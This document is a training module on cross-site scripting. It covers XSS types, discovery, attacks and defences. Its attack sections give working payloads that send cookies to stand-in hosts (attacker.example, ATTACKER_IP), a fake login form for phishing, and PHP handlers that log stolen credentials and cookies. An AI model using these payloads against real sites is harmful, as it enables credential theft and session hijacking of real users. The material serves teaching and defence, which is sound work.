# Module 7: Cross-Site Scripting (XSS)

## XSS Basics

### Intro to XSS

**Quick Notes**

* XSS is a common web vulnerability caused by improper handling of user input.
* It enables execution of attacker-controlled JavaScript in a user’s browser.
* Client-side only, but high prevalence makes it a meaningful security risk.

Cross-Site Scripting (XSS) occurs when a web application includes unsanitized or improperly encoded user input in content rendered by the browser. This allows attackers to inject JavaScript that executes in the context of the application when another user views the affected page.

***

#### What Is XSS

**Quick Notes**

* JavaScript injection via user-controlled input.
* Executed when the page is rendered in a browser.
* Does not directly compromise backend systems.

Web applications deliver HTML from a backend server to a client browser. If user input is incorporated into this HTML without proper sanitization or output encoding, an attacker can inject JavaScript into fields such as comments, messages, or search parameters. When rendered, the browser executes the injected script as if it were legitimate application code.

XSS primarily impacts users rather than servers. Despite limited direct backend impact, the frequency of these vulnerabilities elevates their overall risk.

***

#### Risk Considerations

**Quick Notes**

* High probability, lower direct technical impact.
* Typically classified as medium risk.
* Mitigation focuses on prevention and reduction.

From a risk-management perspective, XSS combines low-to-moderate impact with high likelihood. This places it in a category where risk reduction through secure development practices is preferred over acceptance or transfer.

***

#### XSS Attacks

**Quick Notes**

* Constrained to browser JavaScript execution.
* Can act on behalf of the victim user.
* May be chained with browser vulnerabilities.

XSS attacks can steal session cookies, perform authenticated actions, or manipulate application behavior within the browser. While limited by same-origin and sandboxing controls, XSS can still enable significant abuse. In advanced scenarios, attackers may chain XSS with browser exploits to escape sandbox restrictions.

Historical incidents demonstrate the scale of XSS exploitation, including self-propagating payloads and mass automated actions in large platforms. These examples reinforce that XSS remains a practical and persistent threat.

***

#### Types of XSS

**Quick Notes**

* Three primary categories.
* Classified by where input is processed.
* Each type has different detection and mitigation characteristics.

**Stored (Persistent) XSS**

* Malicious input is saved server-side.
* Payload executes whenever stored content is rendered.
* Common in posts, comments, and user profiles.
* Highest severity due to repeated exposure.

**Reflected (Non-Persistent) XSS**

* Input is reflected directly in server responses.
* Not stored persistently.
* Common in search results and error messages.

**DOM-Based XSS**

* Entirely client-side vulnerability.
* Input processed by browser JavaScript.
* Backend server may not receive the payload.
* Often involves URL parameters or dynamic DOM updates.

Subsequent sections will examine each type in detail, including how they arise and how they are exploited.

***

### Stored XSS

**Quick Notes**

* Stored (Persistent) XSS is the most severe XSS type.
* Malicious input is saved server-side and rendered later.
* Every user who views the affected content is impacted.
* Remediation requires backend data cleanup.

Stored XSS, also known as Persistent XSS, occurs when attacker-controlled input is written to a backend data store and later retrieved and rendered by the application. Because the payload persists beyond the original request, it executes automatically for any user who loads the affected page.

This persistence makes Stored XSS significantly more dangerous than non-persistent variants. The attack continues until the malicious data is explicitly removed from the backend.

***

#### Why Stored XSS Is Critical

**Quick Notes**

* Wide victim scope.
* No attacker interaction required after injection.
* Often difficult to detect and remove.

Once stored, the payload executes for all visitors, not just the attacker. The vulnerability may remain active indefinitely, depending on how and where the data is stored. Cleanup typically requires identifying and removing malicious records from the database rather than fixing a single request path.

***

#### Example Scenario: Stored Input in a To-Do List

**Quick Notes**

* User input is stored and rendered.
* No sanitization or output encoding.
* Payload executes on page load.

Consider a simple to-do list application that allows users to add tasks. When a task is submitted, it is saved and displayed on the page. Submitting a normal value such as `test` results in that value being rendered as part of the list.

If the application does not sanitize or encode user input, this behavior may allow XSS payloads to be stored and executed.

***

#### XSS Testing Payload

**Quick Notes**

* Simple and visible.
* Confirms execution context.

A common test payload for Stored XSS is:

```html
<script>alert(window.origin)</script>
```

This payload is easy to identify and confirms execution by displaying the page origin. It is especially useful when applications use embedded frames, as it reveals where the script is actually running.

If the alert appears immediately after submission or after refreshing the page, the payload has executed successfully.

***

#### Source Code Verification

**Quick Notes**

* Confirms server-side storage.
* Payload appears in rendered HTML.

Viewing the page source after submission shows the injected payload embedded in the HTML output, for example:

```html
<div></div>
<ul class="list-unstyled" id="todo">
    <ul>
        <script>alert(window.origin)</script>
    </ul>
</ul>
```

The presence of the payload in the page source confirms that the input was stored on the backend and re-served to the browser.

***

#### Confirming Persistence

**Quick Notes**

* Payload survives refresh.
* Affects all visitors.

Refreshing the page triggers the alert again, confirming that the payload is persistent. Any user who visits the page will execute the same JavaScript, making this a true Stored XSS vulnerability.

***

#### Browser and Payload Considerations

**Quick Notes**

* Some functions may be restricted.
* Alternative payloads improve reliability.

Modern browsers may block certain JavaScript functions such as `alert()` in specific contexts. Alternative payloads can help validate execution:

* `<plaintext>`: Stops HTML parsing and renders subsequent content as plain text.
* `<script>print()</script>`: Opens the browser print dialog and is rarely blocked.

These payloads are useful when visible alerts are suppressed.

***

#### Example: Cookie Theft via Stored XSS

**Quick Notes**

* Demonstrates real-world impact.
* Executes automatically for all users.
* Enables session hijacking.

A more realistic payload targets session cookies:

```html
<script>
    fetch("https://attacker.example/collect?c=" + document.cookie);
</script>
```

When stored and rendered, this payload silently sends each visitor’s cookies to an attacker-controlled endpoint. If session cookies are not marked as `HttpOnly`, they can be accessed via `document.cookie`, allowing attackers to hijack authenticated sessions.

> **Note:** Proper use of `HttpOnly`, `Secure`, and `SameSite` cookie attributes significantly reduces this risk, but misconfigurations are common.

***

#### Key Takeaways

**Quick Notes**

* Stored XSS persists until removed.
* Impacts all users who view the content.
* Represents the highest XSS risk category.

Stored XSS combines persistence, broad impact, and low attacker effort after injection. For these reasons, it is generally considered the most dangerous form of Cross-Site Scripting and should be prioritized during security testing and remediation.

***

### Reflected XSS

**Quick Notes**

* Non-persistent XSS processed by the backend server.
* Payload is reflected in the response, not stored.
* Affects only users who trigger the malicious request.
* Commonly delivered via crafted URLs.

There are two non-persistent XSS types: Reflected XSS and DOM-based XSS. In Reflected XSS, attacker-controlled input is sent to the backend server and immediately returned in the response without proper sanitization or output encoding. Unlike Stored XSS, the payload does not persist across refreshes or navigation, so it does not automatically impact other users.

***

#### How Reflected XSS Occurs

**Quick Notes**

* Input reaches the backend server.
* Reflected directly in dynamic responses.
* Often appears in error or confirmation messages.

Reflected XSS appears when applications echo user input back to the browser as part of a response. Typical locations include validation errors and status messages. If reflected input is not sanitized or encoded, injected JavaScript executes when the browser renders the response.

Because these responses are transient, execution is limited to the lifetime of the request.

***

#### Example Scenario: Reflected Input in an Error Message

**Quick Notes**

* Input is rejected but echoed.
* JavaScript executes immediately.
* Payload disappears after leaving the page.

In a to-do list application, submitting a normal value such as `test` results in an error message:

> Task 'test' could not be added.

The application includes the submitted value directly in the message. If no sanitization is applied, this behavior can be exploited.

Submitting the following payload and clicking **Add**:

```html
<script>alert(window.origin)</script>
```

produces an alert dialog, confirming that the injected JavaScript executed when the response rendered.

***

#### Source Code Verification

**Quick Notes**

* Confirms reflection in the response.
* Payload embedded in HTML output.

Viewing the page source shows the payload inside the error message:

```html
<div></div>
<ul class="list-unstyled" id="todo">
    <div style="padding-left:25px">
        Task '<script>alert(window.origin)</script>' could not be added.
    </div>
</ul>
```

Because the payload is wrapped in a `<script>` tag, the browser executes it instead of rendering it as text, leaving empty quotes in the displayed message.

***

#### Confirming Non-Persistence

**Quick Notes**

* Payload does not survive refresh.
* No execution on subsequent visits.

Reloading or revisiting the page causes the error message to disappear and the payload to stop executing. This confirms that the vulnerability is non-persistent and tied to the original request.

***

#### Targeting Victims with Reflected XSS

**Quick Notes**

* Delivery depends on HTTP method.
* GET requests expose payloads in URLs.
* Exploitation relies on social engineering.

Inspecting network traffic shows that the vulnerable action uses a GET request, meaning user input is included in the URL as query parameters. An attacker can copy the full request URL from the address bar or the Network tab and send it to a victim. When the victim visits the crafted URL, the server reflects the payload and the browser executes it.

***

#### Example: Cookie Theft via Reflected XSS

**Quick Notes**

* Demonstrates real-world impact.
* Executes only for the victim who clicks the link.
* Common post-exploitation objective.

Instead of a visible alert, a payload can silently exfiltrate cookies:

```html
<script>
    fetch("https://attacker.example/collect?c=" + document.cookie);
</script>
```

When a victim visits a crafted URL containing this payload, the browser sends accessible cookies to the attacker-controlled endpoint, enabling session abuse tied to that single request.

***

### DOM XSS

**Quick Notes**

* Non-persistent XSS handled entirely client-side.
* Input never reaches the backend server.
* JavaScript updates the DOM directly.
* Exploitation depends on unsafe DOM sinks.

DOM-based XSS is the third major XSS category and, like Reflected XSS, is non-persistent. Unlike Reflected XSS, the injected input is never sent to the backend server. Instead, it is processed entirely within the browser by client-side JavaScript that modifies the page through the Document Object Model (DOM).

DOM XSS occurs when JavaScript reads attacker-controlled input and writes it into the page without proper sanitization.

***

#### Identifying DOM-Based Processing

**Quick Notes**

* No HTTP requests triggered by input.
* Input appears in the URL fragment.
* Processing happens entirely in JavaScript.

In a vulnerable to-do list application, adding a task such as `test` updates the page to show:

> Next Task: test

Inspecting the Network tab after submitting the input shows that **no HTTP requests are made**. Instead, the input appears after a `#` character in the URL. URL fragments are processed entirely by the browser and are never sent to the server, indicating client-side handling.

***

#### Page Source vs Rendered DOM

**Quick Notes**

* Input not visible in raw page source.
* JavaScript modifies DOM after load.
* Data is not retained on refresh.

Viewing the page source (`CTRL+U`) does not show the injected value. This is because the HTML source is fetched before JavaScript executes. The DOM is modified afterward when the user interacts with the page.

Using the browser’s DOM inspector (`CTRL+SHIFT+C`) shows the rendered content, including the injected task value. Refreshing the page removes the input, confirming the vulnerability is non-persistent.

***

#### Source and Sink

**Quick Notes**

* Source: where input originates.
* Sink: where input is written to the DOM.
* Unsafe sinks enable XSS.

DOM XSS relies on the interaction between a **source** and a **sink**:

* **Source**: JavaScript-controlled input such as URL parameters or input fields.
* **Sink**: A function that writes data into the DOM.

Common unsafe sinks include:

* `document.write()`
* `DOM.innerHTML`
* `DOM.outerHTML`

Common jQuery sinks include:

* `add()`
* `after()`
* `append()`

If attacker-controlled input reaches one of these sinks without sanitization, the page is vulnerable.

***

#### Vulnerable Code Example

**Quick Notes**

* Input read from URL.
* Written directly into DOM.
* No sanitization applied.

The application’s JavaScript extracts input from the URL:

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

The value is then written to the DOM using `innerHTML`:

```javascript
document.getElementById("todo").innerHTML =
    "<b>Next Task:</b> " + decodeURIComponent(task);
```

Because the input is fully attacker-controlled and written without sanitization, this creates a DOM XSS vulnerability.

***

#### DOM XSS Payloads

**Quick Notes**

* `<script>` tags may not execute.
* Event-handler payloads are effective.
* Payload choice depends on sink behavior.

Using a `<script>` payload does not execute in this case because `innerHTML` blocks `<script>` tags. However, other HTML-based payloads still execute.

Example payload:

```html
<img src="" onerror=alert(window.origin)>
```

This payload creates an image element with an `onerror` handler. Since the image source is invalid, the error handler executes automatically, triggering JavaScript execution without using `<script>` tags.

Submitting this payload causes an alert to appear, confirming successful DOM-based XSS.

***

#### Targeting Users

**Quick Notes**

* Delivered via crafted URLs.
* No backend interaction required.
* Executes on page load.

Because the payload resides entirely in the URL fragment, exploitation involves sharing a crafted URL with a victim. When the victim visits the URL, the client-side JavaScript processes the fragment and executes the payload immediately.

DOM XSS exploitation relies heavily on understanding JavaScript behavior, sink limitations, and browser parsing rules. More advanced payloads are often required depending on application logic and browser security features.

***

### XSS Discovery

**Quick Notes**

* Detection can be as challenging as exploitation.
* XSS discovery applies to all three XSS types.
* Automated tools help, but manual validation is always required.
* Code review is the most reliable detection method.

At this point, the fundamentals of XSS and its three variants should be clear. XSS works by injecting JavaScript into client-side execution contexts, enabling attackers to run additional code in a victim’s browser. This section focuses on how XSS vulnerabilities are discovered in practice, both automatically and manually.

***

#### Automated Discovery

**Quick Notes**

* Uses scanners to detect potential XSS.
* Includes passive and active techniques.
* Results require manual verification.

Most web application vulnerability scanners support detection of Stored, Reflected, and DOM-based XSS. These tools typically operate using two approaches:

* **Passive scanning**: Analyzes client-side code to identify potentially unsafe DOM operations.
* **Active scanning**: Sends crafted payloads to application inputs to test for execution.

Commercial tools often provide higher accuracy, especially when bypass techniques are required, but open-source tools can still be effective. These tools usually identify input fields, inject XSS payloads, and then analyze responses to see whether the payload appears in the rendered output.

However, reflected payloads appearing in responses does not guarantee execution. Browser behavior, sanitization, or context may prevent the payload from running. Manual confirmation is always necessary.

***

#### Open-Source XSS Discovery Tools

**Quick Notes**

* Useful for initial identification.
* Payload-based detection.
* False positives are common.

Some commonly used open-source XSS discovery tools include:

* XSStrike
* Brute XSS
* XSSer

As an example, XSStrike can be cloned and executed as follows:

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

Running the tool against a URL with parameters:

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

Example output:

```
XSStrike v3.1.4

[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: task
[!] Reflections found: 1
[~] Analysing reflections
[~] Generating payloads
[!] Payloads generated: 3072
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
[!] Efficiency: 100
[!] Confidence: 10
```

This output indicates that the `task` parameter is likely vulnerable. Payloads identified by tools should always be tested manually to confirm actual execution.

***

#### Manual Discovery

**Quick Notes**

* Difficulty depends on application security.
* Simple cases use payload testing.
* Advanced cases require code review.

Manual XSS discovery ranges from straightforward payload testing to in-depth code analysis. Basic vulnerabilities can often be identified by testing known payloads. More advanced cases require understanding application logic and execution flow.

***

#### XSS Payload Testing

**Quick Notes**

* Tests input handling directly.
* Payload effectiveness varies by context.
* Inefficient at scale.

A common manual technique is injecting known XSS payloads into input fields and observing behavior. Large payload collections are publicly available and cover a wide range of injection contexts and bypass techniques.

XSS injection points are not limited to HTML form fields. User-controlled data in HTTP headers such as `Cookie` or `User-Agent` can also lead to XSS if reflected or rendered in responses.

Many payloads will fail even when vulnerabilities exist. This is expected, as payloads are often tailored to specific injection contexts, such as inside attributes, JavaScript blocks, or quoted strings. Because of this, manual payload testing can be slow and inefficient, especially on applications with many inputs.

In some cases, writing a custom script to automate payload injection and response comparison can be more effective. This allows fine-tuning payloads and analysis logic for a specific application. This approach is advanced and beyond the scope of this section.

***

#### Code Review

**Quick Notes**

* Most reliable detection method.
* Applies to frontend and backend code.
* Enables precise payload construction.

Manual code review is the most dependable way to identify XSS vulnerabilities. By tracing user input from entry point to browser rendering, it is possible to determine whether proper sanitization or encoding occurs at each step.

Earlier, DOM-based XSS examples demonstrated how reviewing JavaScript source code can reveal unsafe source-to-sink flows. Similar analysis applies to backend code that generates HTML responses.

Modern web applications often pass automated scanning before release, making tool-based discovery less effective. In such cases, manual review may uncover vulnerabilities that survive public deployment. These techniques are advanced and require strong familiarity with secure coding and application internals.

***

## XSS Attacks

### Defacing

Defacing is a common **Stored XSS exploitation pattern** where injected JavaScript alters how a page looks for **every visitor**. Because Stored XSS executes on each page load, visual changes persist across refreshes and sessions until the payload is removed from the backend.

The goal is usually not aesthetics, but **visibility**: a clear signal that the application was compromised.

***

#### Defacement Elements

Defacing via XSS relies on modifying a small set of browser-accessible properties. In practice, only a few DOM elements are used repeatedly:

* **Background color**\
  `document.body.style.background`
* **Background image**\
  `document.body.background`
* **Page title**\
  `document.title`
* **Page content**\
  `DOM.innerHTML`

Using two or three of these together is usually sufficient to overwrite the page’s original appearance.

***

#### Example: Changing the Background Color

Using the Stored XSS–vulnerable to-do list from earlier, a simple payload can permanently change the background for all users.

```html
<script>document.body.style.background = "#141d2b"</script>
```

After submitting this payload:

* The background color changes immediately
* The change persists after refresh
* Any visitor to the page sees the modified background

Any valid CSS color can be used, including named colors or other hex values.

***

#### Example: Setting a Background Image

Instead of a color, an image can be used:

```html
<script>document.body.background = "https://example.com/logo.svg"</script>
```

This replaces the page background with an externally hosted image. As with the color example, the change is persistent because the payload is stored server-side.

***

#### Example: Changing the Page Title

The browser tab title can be modified using `document.title`:

```html
<script>document.title = 'Compromised'</script>
```

Once executed, the tab text updates immediately, providing a visible indicator even before the page content loads.

***

#### Example: Changing Page Text with DOM.innerHTML

To modify visible page content, injected JavaScript can write directly to DOM elements.

Changing a specific element:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

Using jQuery (if present on the page):

```javascript
$("#todo").html("New Text");
```

These approaches allow fine-grained text replacement but may leave other page elements intact.

***

#### Example: Replacing the Entire Page Body

Most real defacements replace **all visible content** by overwriting the `<body>` element.

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

This removes all existing content from view and replaces it with attacker-controlled HTML.

In practice, the replacement HTML is prepared separately, tested locally, then injected as a single-line payload.

***

#### Example: Full Stored XSS Defacement Payload

Prepared HTML (tested separately):

```html
<center>
    <h1 style="color: white">Security Training</h1>
    <p style="color: white">
        by <img src="https://example.com/logo.svg" height="25px">
    </p>
</center>
```

Minified and embedded into a Stored XSS payload:

```html
<script>
document.getElementsByTagName('body')[0].innerHTML =
'<center><h1 style="color: white">Security Training</h1><p style="color: white">by <img src="https://example.com/logo.svg" height="25px"></p></center>'
</script>
```

After submission:

* The page renders only the injected content
* The change persists across refreshes
* All visitors see the defaced page

***

#### Resulting Page Source Behavior

After multiple Stored XSS payloads are injected, the original HTML still exists in the source, with injected scripts appended near the injection point:

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = "Compromised"</script>
<script>document.getElementsByTagName('body')[0].innerHTML = "...SNIP..."</script>
```

The browser executes these scripts sequentially, altering the page after load. If the injection point were earlier in the document, later scripts or elements might still render, requiring additional payload adjustments.

To users, however, the result appears fully defaced.

***

### Phishing

Phishing via XSS abuses trust in a legitimate page by **injecting attacker-controlled UI** that harvests credentials. This pattern is most effective when the page is already familiar to the victim and the injected content looks native.

The canonical XSS phishing flow is:

1. Find an XSS that executes reliably.
2. Inject a fake login form.
3. Capture submitted credentials.
4. Optionally redirect the victim back to the original page to reduce suspicion.

***

#### Example: Finding an XSS in an Image Viewer

Target page: a simple **image viewer** that accepts an image URL and renders it.

Initial behavior:

* Submitting a normal image URL renders the image.
* Submitting a basic XSS payload (for example, a `<script>` alert) **does not execute**.
* The browser shows a broken image icon instead.

This means:

* Input is reflected or processed
* Context likely blocks `<script>` tags
* Discovery is required to find a payload compatible with how input is rendered

At this point, apply the same **XSS discovery process** used earlier:

* Inspect how input appears in the rendered DOM
* Check the page source after submission
* Adjust payloads to match the context

Once a payload executes JavaScript, move to exploitation.

***

#### Example: Injecting a Fake Login Form

Goal: display a login prompt that sends credentials to an attacker-controlled server.

A minimal HTML login form:

```html
<h3>Please login to continue</h3>
<form action="http://ATTACKER_IP">
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

This form sends credentials via a GET request to `ATTACKER_IP`.

To inject HTML into the vulnerable page, use JavaScript that writes directly to the document:

```javascript
document.write(
'<h3>Please login to continue</h3>' +
'<form action="http://ATTACKER_IP">' +
'<input type="username" name="username" placeholder="Username">' +
'<input type="password" name="password" placeholder="Password">' +
'<input type="submit" name="submit" value="Login">' +
'</form>'
);
```

Minify this into a single line and place it inside the working XSS payload identified during discovery. For Reflected XSS, this payload is delivered via a crafted URL.

Result:

* The page renders a login form
* The rest of the page is still visible underneath

***

#### Example: Cleaning Up the Page

If the original input field remains visible, it undermines the phishing message.

Inspect the page using the DOM inspector and identify the element to remove. In this case, the image URL form has the ID `urlform`:

```html
<form role="form" action="index.php" method="GET" id="urlform">
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Remove it with JavaScript:

```javascript
document.getElementById('urlform').remove();
```

Combine this with the earlier injection:

```javascript
document.write(
'<h3>Please login to continue</h3>' +
'<form action="http://ATTACKER_IP">' +
'<input type="username" name="username" placeholder="Username">' +
'<input type="password" name="password" placeholder="Password">' +
'<input type="submit" name="submit" value="Login">' +
'</form>'
);
document.getElementById('urlform').remove();
```

Now the page presents **only** the login prompt.

***

#### Example: Hiding Remaining Page Content

If residual HTML still appears below the injected form, comment it out by appending an HTML comment opener after the payload:

```html
...PAYLOAD... <!--
```

This prevents the rest of the original markup from rendering, making the page appear intentionally gated behind a login.

***

#### Example: Capturing Credentials with Netcat

When the victim submits the form, the browser sends a GET request to the attacker server.

Start a listener:

```bash
sudo nc -lvnp 80
```

Victim submits credentials `test:test`.

Observed request:

```
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: ATTACKER_IP
```

Credentials are visible directly in the request.

Limitation:

* Netcat does not respond correctly to HTTP
* Victim sees a connection error, which may raise suspicion

***

#### Example: Capturing Credentials with a PHP Handler

To log credentials and return the victim to the original page, use a simple PHP script.

`index.php`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_SITE/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Start the server:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
php -S 0.0.0.0:80
```

Victim submits the form:

* Credentials are written to `creds.txt`
* Victim is redirected back to the image viewer
* Page appears to function normally

Verify capture:

```bash
cat creds.txt
```

```
Username: test | Password: test
```

***

#### Result

With a working XSS and minimal JavaScript:

* A legitimate page is converted into a credential-harvesting portal
* Victims interact with a familiar interface
* Credentials are captured silently
* The page can be restored visually to reduce suspicion

This pattern applies to **any XSS context** where attacker-controlled HTML can be rendered.

### Session Hijacking

Session hijacking via XSS abuses the browser’s ability to attach **session cookies** to requests. If attacker-controlled JavaScript can read and exfiltrate those cookies, the attacker can impersonate the victim without knowing credentials.

This section covers **blind XSS discovery** followed by **cookie exfiltration and reuse**.

***

#### Example: Blind XSS in a Registration Workflow

Target behavior:

* A **user registration form** with multiple fields (name, username, password, email, website).
*   After submission, the user sees only a confirmation message:

    > “An administrator will review your registration request.”

Key observation:

* User input is rendered somewhere else (an admin panel).
* The rendering context is **not visible to the attacker**.
* This is a **Blind XSS** scenario.

You cannot rely on visible alerts here. Execution must be detected indirectly.

***

#### Example: Detecting Blind XSS via Callback

Instead of `alert()`, use JavaScript that **calls back to your server**.\
If you receive a request, the payload executed.

Start a listener:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
php -S 0.0.0.0:80
```

***

#### Example: Loading a Remote Script to Identify the Vulnerable Field

HTML allows loading external JavaScript:

```html
<script src="http://ATTACKER_IP/script.js"></script>
```

To identify **which input field executes**, change the requested path to match the field name:

```html
<script src="http://ATTACKER_IP/username"></script>
```

If your server receives a request for `/username`, that field is vulnerable.

***

#### Example: Blind XSS Payload Variants

Different contexts require different payload shapes. Common variants include:

```html
<script src=http://ATTACKER_IP></script>
'><script src=http://ATTACKER_IP></script>
"><script src=http://ATTACKER_IP></script>
javascript:eval('var a=document.createElement("script");a.src="http://ATTACKER_IP";document.body.appendChild(a)')
<script>$.getScript("http://ATTACKER_IP")</script>
```

Practical notes:

* Prefixes like `'` or `">` matter depending on backend rendering.
* Not all fields are worth testing:
  * Email fields often enforce format validation.
  * Password fields are usually hashed and not rendered.

Test remaining fields iteratively:

```html
<script src=http://ATTACKER_IP/fullname></script>
<script src=http://ATTACKER_IP/username></script>
```

When a request hits your server, note:

* The **payload that worked**
* The **field that triggered it**

At this point, discovery is complete.

***

#### Example: Preparing the Cookie-Stealing Payload

Once execution is confirmed, replace the discovery payload with a **cookie exfiltration payload**.

Two common options:

```javascript
document.location = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

```javascript
new Image().src = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

The image-based version is preferred:

* No visible navigation
* Less suspicious in the victim’s browser

Save this as `script.js` on your server:

```javascript
new Image().src = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

Update the XSS payload to load it:

```html
<script src=http://ATTACKER_IP/script.js></script>
```

***

#### Example: Logging Cookies on the Server

Create a handler to capture and store cookies cleanly.

`index.php`:

```php
<?php
if (isset($_GET['c'])) {
    $cookies = explode(";", $_GET['c']);
    foreach ($cookies as $cookie) {
        $decoded = urldecode($cookie);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$decoded}\n");
        fclose($file);
    }
}
?>
```

With the PHP server running, wait for the victim (or admin) to view the vulnerable page.

Expected server activity:

```
GET /script.js
GET /index.php?c=session_id=abcdef123456
```

Verify capture:

```bash
cat cookies.txt
```

Example output:

```
Victim IP: 10.0.0.5 | Cookie: session_id=abcdef123456
```

***

#### Example: Reusing the Stolen Session

Navigate to the protected login page (for example, `/hijacking/login.php`).

In browser developer tools:

* Open storage / cookies
* Add a new cookie:
  * **Name**: `session_id`
  * **Value**: `abcdef123456`
  * **Path**: application path

Refresh the page.

Result:

* Browser is now authenticated as the victim
* No credentials required

***

#### Resulting Pattern

This attack chain demonstrates:

* Blind XSS discovery without visual feedback
* Field-level identification via remote callbacks
* Cookie exfiltration through injected JavaScript
* Full session takeover via manual cookie injection

Any XSS that allows JavaScript execution in an authenticated user’s context can enable this flow.

## XSS Prevention

### XSS Prevention

XSS prevention is about **breaking the source → sink path** that all previous attacks relied on. Every exploit you used depended on either unsafe input reaching execution context or unsafe output being rendered by the browser.

This section mirrors the attack techniques you just used and shows **how those exact paths are closed**.

***

#### Example: Front-End Input Validation (Blocking Invalid Data Early)

Front-end validation is not a security boundary, but it reduces accidental exposure and noisy payloads.

In earlier discovery examples, the application rejected malformed email input. That was enforced client-side with JavaScript:

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

Effect:

* Invalid formats never reach submission
* Reduces attack surface
* Does **not** stop a determined attacker using crafted requests

This is convenience and hygiene, not a defense.

***

#### Example: Front-End Input Sanitization (DOM XSS Defense)

DOM-based XSS attacks relied on unsafe sinks like `DOM.innerHTML`.

To safely handle user-controlled HTML in the browser, sanitize it **before insertion**.

Using DOMPurify:

```html
<script src="dist/purify.min.js"></script>
```

```javascript
let clean = DOMPurify.sanitize(dirty);
```

Effect:

* Escapes or removes executable HTML and JavaScript
* Prevents DOM XSS when writing content to the page
* Especially important when using `DOM.innerHTML`

This directly breaks the DOM XSS examples you exploited earlier.

***

#### Example: Avoiding Dangerous Front-End Sinks

All DOM XSS payloads depended on writing **raw user input** into execution-capable contexts.

Avoid inserting user input into:

```html
<script></script>
<style></style>
<!-- -->
```

Avoid writing user input using:

* `DOM.innerHTML`
* `DOM.outerHTML`
* `document.write()`
* `document.writeln()`
* `document.domain`

Avoid jQuery sinks:

* `html()`
* `parseHTML()`
* `add()`
* `append()`
* `prepend()`
* `after()`
* `insertAfter()`
* `before()`
* `insertBefore()`
* `replaceAll()`
* `replaceWith()`

If user input must be displayed:

* Use text-safe APIs
* Encode or sanitize first
* Never trust raw strings

These restrictions directly eliminate the sinks you abused in DOM-based XSS and defacement attacks.

***

#### Example: Back-End Input Validation (Stopping Reflected and Stored XSS)

Front-end controls are bypassable. All meaningful protection must exist server-side.

PHP email validation:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // process input
} else {
    // reject input
}
```

Effect:

* Malformed input never reaches rendering
* Reflected XSS payloads fail early
* Stored XSS payloads never persist

Equivalent validation must exist in every backend language used.

***

#### Example: Back-End Input Sanitization (Breaking Stored XSS)

Stored XSS worked because unsanitized input was **saved and later rendered**.

PHP sanitization:

```php
addslashes($_GET['email']);
```

Node.js sanitization:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

Rule:

* Never store raw user input without sanitization
* Never render stored input without encoding

This prevents payload persistence, which broke every stored XSS exploit you used.

***

#### Example: Output Encoding (Safe Display Without Execution)

If user input must be displayed exactly as entered, encode it on output.

PHP encoding:

```php
htmlentities($_GET['email']);
```

Node.js encoding:

```javascript
import encode from 'html-entities';
encode('<'); // &lt;
```

Effect:

* Browser displays content
* No script execution
* No context breakout

This neutralizes both reflected and stored XSS while preserving user data.

***

#### Example: Server-Level Protections (Reducing Impact)

Server configuration limits damage even if XSS slips through.

Common protections:

* HTTPS everywhere
* `X-Content-Type-Options: nosniff`
*   Content Security Policy:

    ```
    script-src 'self'
    ```
* Cookie flags:
  * `HttpOnly`
  * `Secure`

Effect:

* Blocks remote script loading
* Prevents cookie theft via JavaScript
* Reduces session hijacking impact

These defenses directly weaken the phishing and session hijacking chains demonstrated earlier.

***

#### Example: Defense-in-Depth Reality

Even with:

* Validation
* Sanitization
* Encoding
* Headers
* Framework protections
* WAFs

XSS still appears due to:

* Logic flaws
* Missed edge cases
* Unsafe refactors
* Third-party libraries

That is why:

* Offensive testing remains necessary
* Defensive controls must overlap
* No single control is sufficient

***
